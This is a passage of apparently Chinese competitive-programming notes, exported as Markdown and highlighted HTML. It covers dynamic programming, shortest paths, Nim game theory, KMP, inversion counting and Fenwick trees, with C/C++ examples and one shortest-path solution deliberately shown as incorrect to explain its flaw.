如果W&lt;N，可以消减N使得N==W，也可以N乘以多次2然后减去一些1使得N与新的W相同（因为随着N×2，其与K重合的最高二进制位变多，所以说是新的W）\n        -   如果W>N，可以先进行多次加一使得重合，或者是多次×2后多次-1使得重合\n        -   即使W小于N，也有可能先乘以几次2后在进行几次-1比较高效（因为可能后面很多个1，导致如果直接消减W）\n    -   总结起来就是，构造W与N相同的过程中，可以对N乘以一次2、两次2...P次2，对于每种乘2，减去或加上一些1使得重合，然后再计算在此基础上需要的时间\n    -   也就是不断试错的过程\n\n### 子集和问题的动态规划解法\n\n- 如果只是要求出是否有一个解法，或者是要求出有多少个解法，那么动态规划可行\n\n### 子集和问题变形\n\n- 问题：给定一个正整数M和另一个K，要求求出M切分成K份，每份都是正整数的解法有多少。同样可以动态规划\n\n### floyd求最小环\n\n- 最小环的定义：在有向或是无向的简单图中在找到一条路径，其从点x到点x，总的权重最小。（不可以直接x到x，在无向图中也不可以利用x到y，y到x，因为如果可以这样，意味着多重边或是使用同一条边）\n- 如果可以确定w[x][x] = INF，那么floyd然后找到最小的w[x][x]既可。\n- 否则，不可以通过使得所有的w[x][x]变为INF来实现，因为floyd过程中，会使用到\n\n### 查询第K大\n\n- 如果是静态数组，多次查询，直接一个sort\n- 如果是静态数组，一次查询，算导中那个快排变体，$O(N)$\n- 如果是动态数组，字典树——每个数以二进制表示，构造字典树，字典树的node需要维护当前node为root的子树的叶子数目，从而在任意一个非叶子节点，可以选择要走那条路下去——可以算出，二进制比x进制更快\n\n### Nim游戏（博弈论）\n\n- > 定义P-position和N-position，其中P代表Previous，N代表Next。直观的说，上一次move的人有必胜策略的局面是P-position，也就是“后手可保证必胜”或者“先手必败”，现在轮到move的人有必胜策略的局面是N-position，也就是“先手可保证必胜”。更严谨的定义是：1.无法进行任何移动的局面（也就是terminal position）是P-position；2.可以移动到P-position的局面是N-position；3.所有移动都导致N-position的局面是P-position。\n- P-position需要保证所有子格局都是N-position，N-position只要找到第一个子格局是P-position即可。\n- 通过数学归纳法，两堆石子的情况下，两堆相等是P-position\n- > 如果局面不可能重现，或者说positions的集合可以进行拓扑排序，那么每个position或者是P-position或者是N-position，而且可以通过定义计算出来。\n- \n\n### HDU3483\n\n##### [题意] \n输入n, x, m ，求$(1^x)*(x^1)+(2^x)*(x^2)+(3^x)*(x^3)+...+(n^x)*(x^n)$ \n\n##### [解题方法] \n\n设$f[n] = [x^n, n*(x^n), (n^2)*(x^n),..., (n^x)*(x^n)]$，则$f[n][k] = (n^k)*(x^n)$，问题转化为求：$(g[n] = f[1][x]+f[2][x]+...+f[n][x])$，设C(i,j)为组合数，即i种元素取j种的方法数，所以有：$$f[n+1][k] = ((n+1)^k)*(x^(n+1)) \\text{（二次多项式展开）}\\\\ = x*( C(k,0)*(x^n)+C(k,1)*n*(x^n)+...+C(k,k)*(n^k)*(x^n))\\\\= x*(C(k,0)*f[n][0]+C(k,1)*f[n][1]+...+C(k,k)*f[n][k])​$$\n所以得： \n\n```\n |x*1 0................................0|        |f[n][0]|       |f[n+1][0]| \n |x*1 x*1 0............................0|        |f[n][1]|       |f[n+1][1]| \n |x*1 x*2 x*1 0........................0|    *   |f[n][2]|   =   |f[n+1][2]| \n |......................................|        |.......|       |.........| \n |x*1 x*C(k,1) x*C(k,2)...x*C(k,x) 0...0|        |f[n][k]|       |f[n+1][k]| \n |......................................|        |.......|       |.........| \n |x*1 x*C(x,1) x*C(x,2).......x*C(x,x) 0|        |f[n][x]|       |f[n+1][x]| \n |0................................0 1 1|        |g[n-1] |       | g[ n ]  | \n```\n\n### KMP算法理解\n\n#### 预处理算法\n\n- 预处理出来的第 $i$ 位结果 $p[i]$ 是原字符串截止到第 $i$ 那个字符的最小周期，也就是只需要移动最少量的字符 $p[i]$ 既可以使得原先匹配部分再次匹配起来。\n\n### 为什么偶数长度的回文数字串不是primer\n\n- [ref](https://leetcode.com/problems/prime-palindrome/discuss/212297/Why-even-prime-palindromes-are-not-possible)\n- > Because even length prime digit numbers are divisible by 11 therefore are not prime.\n  > It's a trick that has to do powers of 10 and mod 11.\n  > Ex: 10 = 10^1 mod 11 = -1 mod 11\n  > ​      $100 = 10^2 = 1 \\mod 11$\n  > ​      $1000 = 10^3 = -1 \\mod 11$\n  > ​      $10000 = 10^4 = 1 \\mod 11$\n  > See the pattern? \n  > Even exponent powers of 10 are 1 mod 11 \n  > Odd exponent powers of 10 are -1 mod 11.\n  >\n  > We also know decimal numbers are just base 10 expansion of the digits.\n  >\n  > So   $1225 = (10^3*)1 + 2*(10^2) + 2*(10^1) + 5*(10^0).$\n  > ​        using modular arithmetic we can say,\n  >\n  >     1225 MOD 11 = (-1)*1 + 2*(1) + 2*(-1) + 5*(1) = -1 + 2 + 2 + 5 = 8.\n  >     \n  >     In other words, in MOD 11 we calculate what a decimal number is by just alternating the addition and subtraction across the digits.\n  > Another example.\n  >\n  > $1323412 \\mod 11 =   1 -3  +2 -3 +4 -1 +2\\mod 11 = 0.$\n  >\n  > Then it becomes why it is quite obvious why the above logic works for even palindromes.\n  >\n  > Example: \n  >\n  > $321123 =      -3 + 2 - 1 + 1 -2 + 3 = 0$. All the numbers cancel out with each other.\n\n### 贪心算法总结\n\n- 在每个贪心算法后面几乎总有一个DP解法\n- 如何**证明**是否可以用贪心算法求解一个问题？并没有通用方法，但是贪心选择性质和最优子结构是两个关键要素\n- 如果贪心选择时需要考虑众多选择，通常意味着可以改进贪心选择来获得更高效的解法\n\n##### 贪心选择性质\n\n- 可以通过做出局部最优的选择来构造全局最优\n- 证明方法：首先考察某个子问题的最优解，然后用贪心选择替换某个其他选择来修改此解，从而得到一个相似但是更小的子问题\n\n##### 一组有效的步骤\n\n- 确定问题的最优子结构（如果一个问题的最优解包含其子问题的最优解，则称此问题具有最优子结构性质）\n- 设计一个递归解法（该递归解法加上记忆就可以变成自顶向下的DP）\n- 证明如果做出一个贪心选择，就只剩下一个子问题（或许可能是几个子问题？不过子问题的数量确实要比自顶向下的DP解法少）\n- 证明贪心选择总是安全的\n  - 什么是安全的？\n  - 做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的\n  - 做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构\n- 设计一个递归算法实现贪心策略\n- 把递归算法转为迭代算法\n\n##### 一组简化的步骤\n\n- 将最优化问题转为这样的形式：做出一次选择后，只剩下一个子问题需要求解\n- 证明做出贪心选择后，原问题总存在最优解，即贪心选择总是安全的\n- 证明做出贪心选择后，剩余的子问题满足性质：其最优解与贪心选择组合即可得到原问题的最优解，这样就得到了最优子结构\n\n","content":"<h3 id=\"全源最短路径的一种错误解法\"><a href=\"#全源最短路径的一种错误解法\" class=\"headerlink\" title=\"全源最短路径的一种错误解法\"></a>全源最短路径的一种错误解法</h3><ul>\n<li><p>错误代码</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (~<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;N)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// assume that if no edge i-&gt;j, then input w[i][j] will be INF</span></span><br><span class=\"line\">        <span class=\"comment\">// and assume that w[i][i] == 0</span></span><br><span class=\"line\">        FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">            FWD(j, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;w[i][j]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(dp, <span class=\"number\">0xff</span>, <span class=\"keyword\">sizeof</span>(dp));</span><br><span class=\"line\">        FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">            FWD(j, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// if i == j, dfs can still return true answer</span></span><br><span class=\"line\">                dfs(i, j);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">            FWD(j, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"%15d\"</span>, dp[i][j]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> visit[MAXV];</span><br><span class=\"line\"><span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> now, <span class=\"keyword\">int</span> target);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dfs</span><span class=\"params\">(<span class=\"keyword\">int</span> from, <span class=\"keyword\">int</span> target)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(visit, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(visit));</span><br><span class=\"line\">    visit[from] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> __dfs(from, target);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> __dfs(<span class=\"keyword\">int</span> now, <span class=\"keyword\">int</span> target) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (dp[now][target] &gt; <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> dp[now][target];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (now == target) &#123;</span><br><span class=\"line\">        dp[now][target] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>; <span class=\"comment\">// visit[now] will never be true;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = INF;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">0</span>, N) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (visit[i] || w[now][i] == INF || i==now) &#123; <span class=\"comment\">// avoid rings and not edge</span></span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        visit[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> p = __dfs(i, target) + w[now][i];</span><br><span class=\"line\">        visit[i] = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (p &lt; ans) &#123;</span><br><span class=\"line\">            NEXT[now][target] = i; <span class=\"comment\">// record the NEXT vertex of i in the shortest path now-&gt;target</span></span><br><span class=\"line\">            ans = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    dp[now][target] = ans;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ans;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>不可以使用这种dp</p>\n</li>\n<li><p>对于每对点执行dfs，然后执行过程中，记忆化搜索。当然，为了避免执行过程出现不断的走环路的情况，需要使用visit，避免dfs过程中走环路。</p>\n</li>\n<li><p>虽然复杂度是$O(V^3)$ ，但是算法是错的</p>\n</li>\n<li><p>记忆化搜索计算$(begin,target)$ 时，假设dfs过程中经过了点<code>i</code> ，为了避免环，<code>i</code>不可以经过<code>begin</code>，但是，可能$(i,target)$ 的最优路径就是<code>i</code>经过点<code>begin</code> 到达的。</p>\n</li>\n<li><p>但是，记忆化过程中，却把在dfs$(begin,target)$过程中 计算出来的$(i,target)$ 作为<code>i</code> 到<code>target</code> 的结果。</p>\n</li>\n</ul>\n<h3 id=\"NYOJ7\"><a href=\"#NYOJ7\" class=\"headerlink\" title=\"NYOJ7\"></a>NYOJ7</h3><blockquote>\n<h5 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述:\"></a>题目描述:</h5><p>一个街区有很多住户，街区的街道只能为东西、南北两种方向。<br>住户只可以沿着街道行走。<br>各个街道之间的间隔相等。<br>用(x,y)来表示住户坐在的街区。<br>例如（4,20），表示用户在东西方向第4个街道，南北方向第20个街道。<br>现在要建一个邮局，使得各个住户到邮局的距离之和最少。<br>求现在这个邮局应该建在那个地方使得所有住户距离之和最小；</p>\n<h5 id=\"输入描述\"><a href=\"#输入描述\" class=\"headerlink\" title=\"输入描述:\"></a>输入描述:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 第一行一个整数n&lt;20，表示有n组测试数据，下面是n组数据;</span><br><span class=\"line\">&gt; 每组第一行一个整数m&lt;20,表示本组有m个住户，下面的m行每行有两个整数0&lt;x,y&lt;100，表示某个用户所在街区的坐标。</span><br><span class=\"line\">&gt; m行后是新一组的数据；</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<h5 id=\"输出描述\"><a href=\"#输出描述\" class=\"headerlink\" title=\"输出描述:\"></a>输出描述:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 每组数据输出到邮局最小的距离和，回车结束；</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<h5 id=\"样例输入\"><a href=\"#样例输入\" class=\"headerlink\" title=\"样例输入:\"></a>样例输入:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 2</span><br><span class=\"line\">&gt; 3</span><br><span class=\"line\">&gt; 1 1</span><br><span class=\"line\">&gt; 2 1</span><br><span class=\"line\">&gt; 1 2</span><br><span class=\"line\">&gt; 5</span><br><span class=\"line\">&gt; 2 9 </span><br><span class=\"line\">&gt; 5 20</span><br><span class=\"line\">&gt; 11 9</span><br><span class=\"line\">&gt; 1 1</span><br><span class=\"line\">&gt; 1 20</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<h5 id=\"样例输出\"><a href=\"#样例输出\" class=\"headerlink\" title=\"样例输出:\"></a>样例输出:</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 2</span><br><span class=\"line\">&gt; 44</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<ul>\n<li>考虑横坐标的情况，取那个横坐标可以使得大家的在横坐标上需要走的距离最短？显然是中位数——反证法，加入有N个点，如果N是奇数，那么中位数就是d[N/2]，然后，尝试采用第N/2-1个点计算，显然，总量的变化是（设 t = d[N/2]-d[N/2-1] ），$+t<em>(N/2+1)-t</em>N/2$ ，也就是缩短的对于前N/2的用户来说，是缩短了，但是对于后面N/2+1个用户来说延长了</li>\n<li>所以，无论y坐标取值多少，x坐标都要取中位数。同理，y也要取中位数</li>\n</ul>\n<h3 id=\"01背包\"><a href=\"#01背包\" class=\"headerlink\" title=\"01背包\"></a>01背包</h3><ul>\n<li>动态规划算法是伪多项式复杂度$O(NW)$，如果W很大，那么可能，直接枚举N元素的集合的所有子集会更快一些</li>\n</ul>\n<h3 id=\"找出一个序列中任意长度的逆序对\"><a href=\"#找出一个序列中任意长度的逆序对\" class=\"headerlink\" title=\"找出一个序列中任意长度的逆序对\"></a>找出一个序列中任意长度的逆序对</h3><ul>\n<li>首先定义什么是逆序对：比如一个序列是从小到大排列的，那么如果$x_i&gt;x_{i+1}&gt;x_{i+2}&gt;…$那么就是逆序对</li>\n<li>主要思路是，对于n元逆序对，flag数组中的index表示某个序列中的某个等于index的数，而flag[index]的值表示以这个index结尾的n-1元的逆序对的数量</li>\n<li>假设序列有n个数，数的范围是[0, MAX], 首先搞一个int flag[MAX+1], 该数组的所有值初始化为0，还有一个int result[n]</li>\n<li>首先看看如何求二元逆序对<ul>\n<li>从左到右扫描序列，对于值位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li>\n<li>然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li>\n<li>那么result的数组的和就是逆序对的数量</li>\n<li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li>\n</ul>\n</li>\n<li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul>\n<li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li>\n<li>求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li>\n<li>到最后，result_3就是结果</li>\n</ul>\n</li>\n<li>更多元组的也如此思路</li>\n<li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li>\n<li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li>\n<li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li>\n</ul>\n<blockquote>\n<p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p>\n</blockquote>\n<h3 id=\"关于使用优先队列的bfs\"><a href=\"#关于使用优先队列的bfs\" class=\"headerlink\" title=\"关于使用优先队列的bfs\"></a>关于使用优先队列的bfs</h3><ul>\n<li>其实就是dijstra单源最短路径算法</li>\n<li>关于O((V+E)lgV)：对每个点都需要从堆中pop出来（除了源点），对于每条边，都需要把该边对应的一个点压进堆里或者decrease key，consider that，如果一个点被pop出来，那么该点就在result set里，所以不会再被压到堆里。所以是O((V+E)lgV)，如果使用斐波那契堆，因为压到堆里以及decrease key的代价是O(1)，所以是O(VlgV+E)</li>\n</ul>\n<h3 id=\"DP\"><a href=\"#DP\" class=\"headerlink\" title=\"DP\"></a>DP</h3><ul>\n<li>DP要找到什么因素影响了当前你要求的东西，有影响的我们就处理，没影响的我们不用管</li>\n</ul>\n<h3 id=\"浮点数输入\"><a href=\"#浮点数输入\" class=\"headerlink\" title=\"浮点数输入\"></a>浮点数输入</h3><ul>\n<li>由于是二进制，所以有些十进制有限小数成了无限的，所以读取时会截断，所以要加上一个偏移量（比如读入到小数点后6位，可以加一个$2*10^{-7}$，这样，截断部分如果比较大，就可以反映出来，如果比较小，不会对产生进位，则没影响）</li>\n</ul>\n<h3 id=\"枚举所有素数\"><a href=\"#枚举所有素数\" class=\"headerlink\" title=\"枚举所有素数\"></a>枚举所有素数</h3><ul>\n<li>$O(N)$ 的做法 <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> CNT = (<span class=\"keyword\">int</span>)<span class=\"number\">1e9</span>+<span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">bool</span> a[CNT];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    a[<span class=\"number\">0</span>] = a[<span class=\"number\">1</span>] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    FWD(i, <span class=\"number\">2</span>, CNT) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[i]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">2</span> * i; j &lt; CNT; j += i) &#123;</span><br><span class=\"line\">             a[j] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"树状数组\"><a href=\"#树状数组\" class=\"headerlink\" title=\"树状数组\"></a>树状数组</h3><ul>\n<li><p>注意，a[0]是没有放东西的，因为$i-lowbit(i)+1 &gt; 0$</p>\n</li>\n<li><p>插线问点中，每一点 i 的值都是 sum(a[1] to a[i])。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//NYOJ 123</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> c[<span class=\"number\">1000010</span>],N;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">lowbit</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> <span class=\"comment\">//求最低位1的位置所表示的数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x&amp;(-x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> p,<span class=\"keyword\">int</span> q)</span><span class=\"comment\">//常规数组中的a[p]更新，在树状数组中需要这样更新</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(p&lt;=N)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        c[p]+=q;</span><br><span class=\"line\">        p+=lowbit(p);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">S</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span>  <span class=\"comment\">//S(i)表示的是的前i个数的和</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sum=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(x&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        sum+=c[x];</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">\"sum: \"</span>&lt;&lt;sum&lt;&lt;<span class=\"string\">\" \"</span>;</span><br><span class=\"line\">        x-=lowbit(x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> s[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>,&amp;T,&amp;N);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(T--)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,s);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(s[<span class=\"number\">0</span>]==<span class=\"string\">'A'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> l,r,num;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d\"</span>,&amp;l,&amp;r,&amp;num);</span><br><span class=\"line\">            update(l,num);</span><br><span class=\"line\">            update(r+<span class=\"number\">1</span>,-num);</span><br><span class=\"line\">          <span class=\"comment\">//每个士兵 i 的军功都是前 i 个元素的和，所以，[l, m]区间每个人加 num 的军功只需要给</span></span><br><span class=\"line\">          <span class=\"comment\">//l 位置加上num，这样，[l, N]区间的每个人都加上了 num ，但是，我们只要[l, m]，所以要</span></span><br><span class=\"line\">          <span class=\"comment\">//给 m+1 位置减去num,</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> x;</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;x);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,S(x));</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span 